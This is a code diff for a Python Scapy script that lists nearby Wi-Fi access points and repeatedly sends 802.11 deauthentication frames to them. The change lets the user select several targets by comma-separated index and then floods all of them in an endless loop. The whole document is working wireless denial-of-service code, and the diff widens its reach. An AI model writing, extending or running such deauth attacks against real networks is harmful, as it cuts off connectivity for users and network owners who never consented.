@@ -50,18 +50,23 @@ for key,probe in found.items():
 # Print out the list of discovered APs and their index so that the user can choose one
 for i in range(len(probe_list)):
   item = probe_list[i]
-  print(str(i) + " : " + str(item[1]["ssid"])[2:-1])
+  print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])
 
 # Get & process user input
 n = ""
-while n.isdigit() != True:
+while n.replace(",", "").isdigit() != True:
   n = input("AP number to be deauthed: ")
-n = int(n)
-ap = probe_list[n][1]["cli"]
+# n = int(n)
 
-# Create packet
-packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
+aps = list(map(int, n.split(",")))
+print(aps)
 
 # Send packets forever
 while True:
-	sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter
+  for n in aps:
+    ap = probe_list[n][1]["cli"]
+    print(ap)
+
+    # Create & send packet
+    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
+    sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter
